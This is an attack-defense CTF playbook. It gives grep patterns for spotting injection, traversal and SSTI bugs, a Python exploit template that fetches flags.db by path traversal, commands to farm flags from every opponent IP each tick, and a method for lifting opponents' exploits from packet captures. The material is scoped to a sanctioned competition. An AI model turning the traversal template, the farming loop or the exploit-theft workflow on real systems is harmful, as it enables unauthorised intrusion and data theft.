# Attack Playbook

> Scope: only the team IPs the gameserver declares. Fresh flags only — they expire each tick, so
> **automate and loop**; manual submission can't keep up.

## 1. Mindset

The vulnbox is identical for everyone. **Find the bug once on your own box, weaponize it, then fire
it at every opponent every tick.** Points come from *volume* of fresh flags, not from one clever
hit. The whole game is: find bug → script it → `exploit_runner.py` → repeat for each service.

## 2. Find the bug (on YOUR own box — it's identical to theirs)

```bash
# Pull each service's source locally, then:
grep -rniE 'system|exec|popen|shell_exec|eval|pickle|yaml.load|unserialize|subprocess' .
grep -rniE 'open\(|read_file|include|require|sendfile|\.\./' .      # LFI / traversal
grep -rniE 'select .*%|select .*\+|execute\(.*%|query\(.*\+' .       # SQLi
grep -rniE 'secret|token|api[_-]?key|password|admin' .              # hardcoded secrets
grep -rniE 'render_template_string|Template\(|{{' .                 # SSTI
```
Then exercise the app. Flags live somewhere a service reads/writes (a DB table, a file, an in-mem
store). Your job: reach *another team's* copy of that store via the bug.

**Where flags live (check all):** a `flags`/`notes`/`vault` DB table, files under the service dir
named by id/timestamp, an API that returns stored items. The checker stores a flag each tick, so a
recent-item or enumerate-ids primitive usually harvests them.

## 3. Weaponize — the exploit contract

Write each exploit as a **standalone script that takes an IP and prints flags to stdout**, one per
line. That's all `exploit_runner.py` needs. Template:

```python
#!/usr/bin/env python3
# exploit_<service>.py  —  usage: exploit_<service>.py <target_ip>
import sys, re, requests
FLAG = re.compile(r'LsCTF2026\{[^}]+\}')   # <-- confirm real finals format!
ip = sys.argv[1]
base = f"http://{ip}:8080"
s = requests.Session(); s.timeout = 5
try:
    # 1. do the exploit (traversal / SQLi / IDOR / auth-bypass ...)
    r = s.get(f"{base}/notes/../../flags.db", timeout=5)
    # 2. harvest: enumerate recent ids / dump the store
    for m in FLAG.findall(r.text):
        print(m)                       # exploit_runner collects & submits these
except Exception as e:
    print(f"# err {ip}: {e}", file=sys.stderr)
```
Test it against **your own box** first (you know a flag is planted there each tick).

## 4. Fire at everyone — the farm loop

`exploit_runner.py` does the heavy lifting:
- Reads your target list (team IPs, minus yourself).
- Runs your exploit script against each, in parallel, every tick.
- Collects flag-shaped strings, **dedupes**, and **submits** to the scoreboard API.
- Logs which targets yielded (and which went dry = they patched).

```bash
# one-off test:
python3 scripts/exploit_runner.py --exploit ./exploit_notes.py \
    --targets targets.txt --test 10.0.0.5

# full loop, submit every 30s:
python3 scripts/exploit_runner.py --exploit ./exploit_notes.py \
    --targets targets.txt --loop 30 \
    --submit-url https://scoreboard/api/flags --token $API_TOKEN
```
Run **one runner per working exploit** (one per service) in separate tmux panes.

## 5. Steal opponents' exploits (force multiplier)

Everything hitting your box is in your PCAPs. `pcap_steal.py` extracts:
- flag-shaped strings seen in responses (confirms *which* of your services is leaking), and
- the **request** that preceded a leaked flag (that request *is* a working exploit).

Workflow: `pcap_steal.py cap.pcap` → find the magic request → turn it into an exploit script →
feed to `exploit_runner.py` → now you're farming a bug you never had to find. Patch it on your own
box at the same time (defense).

## 6. Flag submission notes

- Flags are **tick-fresh**: submitting a stale one is rejected/penalized. The runner only submits
  flags harvested this cycle and dedupes against a seen-set.
- Learn the API shape first (common patterns):
  - `POST /api/flags`  body `{"flags": ["...","..."]}` + header `X-Team-Token: ...`
  - or one flag per request, or a raw TCP submitter on a port.
  - Edit `submit_flags()` in `exploit_runner.py` to match — it's isolated for exactly this.
- Respect rate limits / anti-spam; the runner batches + backs off.

## 7. Target list format (`targets.txt`)

One target per line. `exploit_runner.py` accepts `ip`, `ip:port`, or `name,ip`:
```
10.60.1.2
10.60.2.2:8080
team3,10.60.3.2
```
Generate a range quickly:
```bash
for i in $(seq 1 20); do echo "10.60.$i.2"; done > targets.txt
# then delete your own team's line!
```

## 8. Attack checklist per service

- [ ] Source read, bug identified on own box
- [ ] Exploit script written, prints flags to stdout
- [ ] Tested green against OWN box (known planted flag)
- [ ] Added to `exploit_runner.py` loop against all targets
- [ ] Submission confirmed accepted on scoreboard
- [ ] Watching for targets going dry (patched) → pivot to next service
- [ ] PCAP monitored for others' exploits on this service
